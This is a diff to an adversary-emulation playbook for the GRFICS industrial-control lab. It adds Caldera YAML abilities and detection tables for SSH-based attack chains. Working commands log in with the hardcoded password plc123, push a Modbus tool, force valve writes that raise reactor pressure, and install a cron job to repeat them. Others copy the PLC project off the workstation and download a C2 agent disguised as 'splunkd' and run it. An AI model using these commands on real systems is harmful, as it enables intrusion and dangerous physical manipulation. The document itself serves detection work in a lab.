+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5 'chmod +x /tmp/modbus_cli && ls -la /tmp/modbus_cli' &&
+      echo "SCP_TO_EWS_DONE"
+    timeout: 120
+```
+
+**Ability: SSH remote — read tank**
+
+```yaml
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000003
+  name: SSH Remote Execution - Read Tank Process State via EWS
+  description: |
+    Executes /tmp/modbus_cli on the EWS over SSH to read Tank IRs (trusted ICS source IP .5).
+  tactic: collection
+  technique_id: T0801
+  technique_name: Monitor Process State
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5
+      '/tmp/modbus_cli 192.168.95.14 --port 502 read_ir 1 2' &&
+      echo "EWS_REMOTE_READ_DONE"
+    timeout: 60
+```
+
+**Ability: SSH remote — pressure excursion**
+
+```yaml
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000004
+  name: SSH Remote Execution - Modbus Pressure Excursion from EWS
+  description: |
+    From EWS over SSH, runs modbus_cli against Purge and Feed 1 to close purge and open feed,
+    causing reactor pressure to rise. Traffic originates from trusted EWS IP (192.168.95.5).
+  tactic: impact
+  technique_id: T0831
+  technique_name: Manipulation of Control
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5
+      'for i in $(seq 1 40); do
+      /tmp/modbus_cli 192.168.95.12 --port 502 write_r 1 0;
+      /tmp/modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
+      sleep 0.1;
+      done' &&
+      echo "EWS_REMOTE_WRITE_IMPACT_DONE"
+    timeout: 120
+```
+
+**Ability: Cron persistence on EWS**
+
+```yaml
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000005
+  name: SSH - Install crontab on EWS for periodic Modbus write
+  description: |
+    Replaces user crontab on engineer@EWS with a periodic job that writes purge valve HR.
+    Lab-only persistence; replaces existing crontab for the engineer user.
+  tactic: lateral-movement
+  technique_id: T0886
+  technique_name: Remote Services
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5
+      'echo "*/15 * * * * /tmp/modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null" | crontab - && crontab -l' &&
+      echo "EWS_CRON_INSTALLED"
+    timeout: 60
+```
+
+**Step 3: Adversary profile**
+
+```yaml
+---
+
+id: cc00BBBB-aaaa-bbbb-cccc-00000000000B
+name: SSH Foothold on EWS Trusted Modbus Execution
+description: |
+  Initial access via SSH from Kali (DMZ) to the engineering workstation using engineer:plc123
+  after simulated failed passwords. Lateral tool transfer via SCP, remote Modbus execution from
+  trusted EWS IP, and crontab persistence.
+atomic_ordering:
+- e5f6a7b8-5555-5555-5555-000000000002  # Download modbus_cli on Kali (Caldera payload)
+- a9b8c7d6-1010-1010-1010-000000000001  # SSH brute simulation + valid login
+- a9b8c7d6-1010-1010-1010-000000000002  # SCP modbus_cli to EWS
+- a9b8c7d6-1010-1010-1010-000000000003  # Remote read Tank via EWS
+- a9b8c7d6-1010-1010-1010-000000000004  # Remote write impact from EWS
+- a9b8c7d6-1010-1010-1010-000000000005  # Crontab persistence on EWS
+```
+
+**Step 4: Operation**
+
+Use **group `red`**, planner `atomic`, fact source `Modbus Sample Facts`. REST example:
+
+```bash
+curl -X POST http://localhost:8888/api/v2/operations \
+  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name": "SSH-EWS-Trusted-Modbus-001",
+    "adversary": {"adversary_id": "cc00BBBB-aaaa-bbbb-cccc-00000000000B"},
+    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
+    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
+    "group": "red",
+    "auto_close": false,
+    "autonomous": 1
+  }'
+```
+
+#### Expected Telemetry and Logs
+
+| Step | Log Source | What to Observe | Detection Data Component |
+|------|-----------|-----------------|-------------------------|
+| Failed SSH | EWS `auth.log` (`shared_logs/ews/auth.log`) | Failed password attempts for `engineer` from 192.168.90.6 | DC0067 / DC0088 |
+| Successful SSH | EWS `auth.log`, `wtmp` | Accepted password for `engineer` from 192.168.90.6 | DC0067 (Logon Session Creation) |
+| SCP / SSH sessions | Router Suricata `eve.json` | TCP/22 between DMZ and ICS; possible SSH protocol metadata | DC0078, DC0085 |
+| Modbus from .5 | Router Suricata, PLC logs | FC 0x06 from **192.168.95.5** to simulation (.10–.15) — trusted-host pattern | DC0082 |
+| Cron install | EWS `cron.log` (`shared_logs/ews/cron.log`) | New crontab for `engineer` | DC0033 / DC0038 |
+| Process impact | Simulation `process_alarms` | Pressure rise, valve anomalies | DC0109 |
+
+#### Expected Impact on the ICS/OT Environment
+
+- **Process**: Reactor pressure increases when purge is closed and feed is forced open; **cron** can repeat purge closure on a schedule.
+- **Visibility**: Detections keyed only on “unauthorized DMZ IP” may **miss** Modbus sourced from **.5** (EWS), highlighting a different defensive posture than Chain 1 (writes from **.6**).
+
+#### Assumptions
+
+- `sshd` on EWS accepts password auth for `engineer` / `plc123`.
+- `crontab` replace is acceptable in the lab (restores from snapshot or backup if needed).
+
+---
+
+### Chain 12: SSH Exfiltration then DMZ Modbus Impact
+
+**Adversary Profile**: Same SSH entry as Chain 11, but the emphasis shifts to **collection**: **SCP pull** of the engineer’s **`chemical.st`** project to Kali (`/tmp/exfil_chemical.st`), then **direct Modbus** valve manipulation **from the Kali agent** (source **192.168.90.6**). Contrasts **trusted** vs **untrusted** Modbus source IPs in the same scenario.
+
+**Kill Chain Summary**: C2 on Kali → SSH brute simulation → SCP exfil of project artifact → Modbus impact from DMZ
+
+#### Technique Mapping
+
+| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
+|------|---------------|-------------|--------|----------------|--------------------------|
+| 1 | Exploitation of Remote Services | T0866 | Initial Access | SSH brute simulation + `plc123` | SSH session |
+| 2 | Lateral Tool Transfer | T0867 | Lateral Movement | Download `modbus_cli` on Kali to run later steps | Tool ready on attacker host |
+| 3 | Data from Local System | T0893 | Collection | `scp engineer@192.168.95.5:/home/engineer/Desktop/chemical.st /tmp/exfil_chemical.st` | Golden copy of PLC project on attacker host |
+| 4 | Manipulation of Control | T0831 | Impact | `modbus_cli` purge close / feed open **from Kali** | Pressure excursion; Modbus from **.6** |
+
+#### Caldera Implementation
+
+**Ability: SCP exfil**
+
+```yaml
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000006
+  name: SCP Exfil - Pull chemical.st from EWS to Kali
+  description: |
+    Copies /home/engineer/Desktop/chemical.st from the EWS to /tmp/exfil_chemical.st on the
+    Kali agent host via scp (SSH). Validates artifact availability for follow-on analysis.
+  tactic: collection
+  technique_id: T0893
+  technique_name: Data from Local System
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5:/home/engineer/Desktop/chemical.st /tmp/exfil_chemical.st &&
+      wc -c /tmp/exfil_chemical.st &&
+      head -15 /tmp/exfil_chemical.st &&
+      echo "EXFIL_CHEMICAL_ST_DONE"
+    timeout: 90
+```
+
+**Adversary profile**
+
+```yaml
+---
+
+id: cc00CCCC-aaaa-bbbb-cccc-00000000000C
+name: SSH Exfiltration then DMZ Modbus Impact
+description: |
+  SSH from Kali to EWS (engineer:plc123) with brute simulation, exfiltrates chemical.st to Kali,
+  then executes direct Modbus valve manipulation from the Kali agent (untrusted DMZ IP) for a
+  contrasting network and detection footprint versus trusted-EWS execution.
+atomic_ordering:
+- e5f6a7b8-5555-5555-5555-000000000002  # modbus_cli on Kali
+- a9b8c7d6-1010-1010-1010-000000000001  # SSH brute simulation + login
+- a9b8c7d6-1010-1010-1010-000000000006  # SCP pull chemical.st to Kali
+- a1b2c3d4-1111-1111-1111-000000000004  # Modbus close purge (from Kali)
+- a1b2c3d4-1111-1111-1111-000000000005  # Modbus open feed 1 (from Kali)
+```
+
+**Operation**: group `red`, same planner/source as Chain 11. Operation name example: `SSH-Exfil-DMZ-Modbus-001`.
+
+#### Expected Telemetry and Logs
+
+| Step | Log Source | What to Observe | Detection Data Component |
+|------|-----------|-----------------|-------------------------|
+| SSH | EWS `auth.log` | Same as Chain 11 | DC0067 |
+| Exfil | EWS audit / Tomcat N/A | SCP read of `Desktop/chemical.st` over SSH session | DC0038 / DC0078 |
+| Modbus | Suricata, PLC | Modbus **from 192.168.90.6** — classic “wrong segment” indicator | DC0082, DC0085 |
+
+#### Expected Impact
+
+- **Intel**: Exfiltrated `chemical.st` supports offline tampering or reverse-engineering (follow-on not in this chain).
+- **Process**: Same physical pressure excursion as Chain 1, but **after** demonstrating **project theft** over SSH.
+
+#### Assumptions
+
+- `/home/engineer/Desktop/chemical.st` exists on the GRFICS workstation image (matches project-infection abilities in the plugin).
+
+---
+
+### Chain 13: SSH Remote Deploy Sandcat on EWS (Phase 1)
+
+**Adversary Profile**: Operator uses **SSH** only (no noVNC) to push a **Sandcat** binary onto the EWS and beacon with **group `ews`**. This is **Phase 1**; a **second** Caldera operation must run **after** the agent registers, using **group `ews`** and abilities such as **Engineering Workstation Pivot** (Chain 5) — **different initial access** than interactive VNC.
+
+**Kill Chain Summary**: DMZ C2 → SSH brute simulation → valid login → SSH remote `curl` Sandcat → background beacon on EWS
+
+#### Technique Mapping
+
+| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
+|------|---------------|-------------|--------|----------------|--------------------------|
+| 1 | Exploitation of Remote Services | T0866 | Initial Access | SSH brute simulation + `plc123` | SSH to EWS |
+| 2 | External Remote Services | T0822 | Initial Access | Remote `curl` from EWS to Caldera `/file/download` | Sandcat staged on EWS |
+| 3 | Remote Services | T0886 | Execution | `nohup ./splunkd ... -group ews` | C2 from ICS host |
+
+#### Caldera Implementation
+
+**Ability: Deploy Sandcat via SSH**
+
+```yaml
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000007
+  name: SSH Remote Execution - Deploy Sandcat on EWS
+  description: |
+    Non-interactive: downloads Sandcat from Caldera (192.168.90.250:8888) on the EWS via SSH
+    and starts it in the background with group ews. Requires prior successful SSH login test
+    (same credentials). Follow with a second Caldera operation targeting group ews.
+  tactic: initial-access
+  technique_id: T0822
+  technique_name: External Remote Services
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5
+      'SERVER="http://192.168.90.250:8888" &&
+      curl -s -X POST -H "file:sandcat.go" -H "platform:linux" ${SERVER}/file/download > /tmp/splunkd &&
+      chmod +x /tmp/splunkd &&
+      nohup /tmp/splunkd -server ${SERVER} -group ews -v > /tmp/sandcat_ews.log 2>&1 &
+      sleep 2 &&
+      tail -3 /tmp/sandcat_ews.log 2>/dev/null; pgrep -a splunkd || true' &&
+      echo "SANDCAT_DEPLOY_SSH_TRIGGERED"
+    timeout: 120
+```
+
+**Adversary profile**
+
+```yaml
+---
+
+id: cc00DDDD-aaaa-bbbb-cccc-00000000000D
+name: SSH Remote Deploy Sandcat on EWS Phase 1
+description: |
+  Phase 1 only: SSH brute simulation + valid login check, then deploy Sandcat on the EWS via
+  SSH remote curl. Run a second Caldera operation with group ews and an adversary that uses
+  EWS-local abilities (e.g. Engineering Workstation Pivot) after the agent registers.
+atomic_ordering:
+- a9b8c7d6-1010-1010-1010-000000000001  # SSH brute simulation + valid login
+- a9b8c7d6-1010-1010-1010-000000000007  # Deploy Sandcat on EWS over SSH
+```
+
+**Step-by-step execution**
+
+1. Start operation **Phase 1** with **group `red`** and adversary `cc00DDDD-aaaa-bbbb-cccc-00000000000D`.
+2. In Caldera **Agents**, wait until a second agent appears from **192.168.95.5** with **group `ews`**.
+3. Start **Phase 2** operation with **group `ews`** and adversary `cc005555-aaaa-bbbb-cccc-000000000005` (or another EWS-local chain).
+
+#### Expected Telemetry and Logs
+
+| Step | Log Source | What to Observe | Detection Data Component |
+|------|-----------|-----------------|-------------------------|
+| SSH | EWS `auth.log` | Accepted password from 192.168.90.6 | DC0067 |
+| C2 from EWS | Router Suricata | HTTP to 192.168.90.250:8888 **from 192.168.95.5** | DC0078 |
+| New agent | Caldera | Agent heartbeat from EWS | — (C2 framework) |
+
+#### Expected Impact
+
+- **Operational**: Enables **all** ICS-local Caldera behaviors (Chain 5, harvest, etc.) **without** noVNC.
+- **Detection**: HTTP beacon from **EWS** to Caldera may be allowlisted incorrectly as “management.”
+
+#### Assumptions
+
+- EWS can reach Caldera at `192.168.90.250:8888` through the router (same as other chains).
+
+#### Summary Comparison: SSH Chains 11–13
+
+| Attribute | Chain 11: SSH trusted Modbus + cron | Chain 12: SSH exfil + DMZ Modbus | Chain 13: SSH deploy Sandcat (phase 1) |
+|-----------|--------------------------------------|----------------------------------|----------------------------------------|
+| **Initial Access** | SSH `engineer`@EWS after failed password attempts | Same SSH pattern | Same SSH pattern |
+| **Primary Difference vs Chain 5** | **No noVNC**; non-interactive **sshpass** | Adds **SCP exfil** of `chemical.st` | **No desktop**; pushes agent via **SSH remote curl** |
+| **Modbus Source IP** | **192.168.95.5** (EWS) via remote exec | **192.168.90.6** (Kali) after exfil | Phase 2 (EWS agent) — not in phase-1 profile |
+| **Persistence** | **Cron** on EWS | None in this profile | Sandcat **group ews** (phase 2) |
+| **High-Value Telemetry** | auth.log + Modbus from .5 | auth.log + file read + Modbus from .6 | auth.log + HTTP beacon **from .5** to Caldera |
 
 ---
 
 ## Master Technique Coverage Table
 
-All 10 chains combined (4 existing + 6 new) cover **55 unique techniques** out of 79 in MITRE ATT&CK for ICS v18:
+All **13** documented chains (1–4 primary, 5–10 extended, **11–13 SSH-centric**) together cover **54 unique techniques** out of 83 in MITRE ATT&CK for ICS v18:
 
 | Technique ID | Technique Name | Covered In Chain(s) |
 |-------------|---------------|-------------------|
 | T0800 | Activate Firmware Update Mode | 9 (PLC mode change as analog) |
-| T0801 | Monitor Process State | 1, 3 |
+| T0801 | Monitor Process State | 1, 3, 11 |
 | T0802 | Automated Collection | 7, 10 |
 | T0803 | Block Command Message | 8 |
 | T0804 | Block Reporting Message | 8 |
@@ -2335,15 +2813,15 @@ All 10 chains combined (4 existing + 6 new) cover **55 unique techniques** out o
 | T0814 | Denial of Service | 6 |
 | T0815 | Denial of View | 7 |
 | T0816 | Device Restart/Shutdown | 8 |
-| T0819 | Exploit Public-Facing Application | 1, 2 |
+| T0819 | Exploit Public-Facing Application | 1, 2, 11 |
 | T0821 | Modify Controller Tasking | 4 |
-| T0822 | External Remote Services | 5 |
+| T0822 | External Remote Services | 5, 13 |
 | T0823 | Graphical User Interface | 7, 8 |
 | T0826 | Loss of Availability | 6 |
 | T0827 | Loss of Control | 2, 10 |
 | T0828 | Loss of Productivity and Revenue | 6 |
 | T0829 | Loss of View | 3 |
-| T0831 | Manipulation of Control | 1, 3, 10 |
+| T0831 | Manipulation of Control | 1, 3, 10, 11, 12 |
 | T0832 | Manipulation of View | 7, 10 |
 | T0835 | Manipulate I/O Image | 5 |
 | T0836 | Modify Parameter | 6 |
@@ -2351,8 +2829,7 @@ All 10 chains combined (4 existing + 6 new) cover **55 unique techniques** out o
 | T0838 | Modify Alarm Settings | 7, 10 |
 | T0840 | Network Connection Enumeration | 5, 6 |
 | T0842 | Network Sniffing | 1 |
-| T0843 | Program Download | 2 |
-| T0845 | Program Upload | 9 |
+| T0845 | Program Upload | 2, 9 |
 | T0846 | Remote System Discovery | 1, 2, 3, 6 |
 | T0848 | Rogue Master | 6 |
 | T0849 | Masquerading | 9 |
@@ -2361,8 +2838,8 @@ All 10 chains combined (4 existing + 6 new) cover **55 unique techniques** out o
 | T0856 | Spoof Reporting Message | 3, 10 |
 | T0858 | Change Operating Mode | 9, 10 |
 | T0861 | Point & Tag Identification | 1, 4 |
-| T0866 | Exploitation of Remote Services | 10 |
-| T0867 | Lateral Tool Transfer | 5, 10 |
+| T0866 | Exploitation of Remote Services | 10, 11, 12, 13 |
+| T0867 | Lateral Tool Transfer | 5, 10, 11, 12 |
 | T0868 | Detect Operating Mode | 6, 9, 10 |
 | T0869 | Standard Application Layer Protocol | 5 |
 | T0871 | Execution through API | 7, 9 |
@@ -2376,12 +2853,12 @@ All 10 chains combined (4 existing + 6 new) cover **55 unique techniques** out o
 | T0882 | Theft of Operational Information | 7 |
 | T0883 | Internet Accessible Device | 5, 10 |
 | T0885 | Commonly Used Port | 5 |
-| T0886 | Remote Services | 5 |
+| T0886 | Remote Services | 5, 11, 13 |
 | T0888 | Remote System Information Discovery | 1, 3, 4 |
 | T0889 | Modify Program | 2, 9, 10 |
 | T0891 | Hardcoded Credentials | 9 |
 | T0892 | Change Credential | 7 (escalation) |
-| T0893 | Data from Local System | 5 |
+| T0893 | Data from Local System | 5, 12 |
 
 **Techniques NOT covered** (infeasible in Docker-based GRFICS): T0817 (Drive-by Compromise), T0830 (Adversary-in-the-Middle), T0834 (Native API), T0847 (Replication via Removable Media), T0851 (Rootkit), T0857 (System Firmware), T0860 (Wireless Compromise), T0862 (Supply Chain Compromise), T0863 (User Execution), T0864 (Transient Cyber Asset), T0865 (Spearphishing Attachment), T0874 (Hooking), T0884 (Connection Proxy), T0887 (Wireless Sniffing), T0890 (Exploitation for PrivEsc), T0894 (System Binary Proxy Execution), T0895 (Autorun Image).
 
@@ -2397,6 +2874,8 @@ server="http://192.168.90.250:8888";
 curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
 chmod +x splunkd; ./splunkd -server $server -group red -v
 ```
+
+**SSH abilities (Chains 11–13)** require `sshpass` on Kali: `apt-get update && apt-get install -y sshpass`. Target: `engineer@192.168.95.5`, password `plc123`.
 
 **EWS agent (ICS network):**
 ```bash
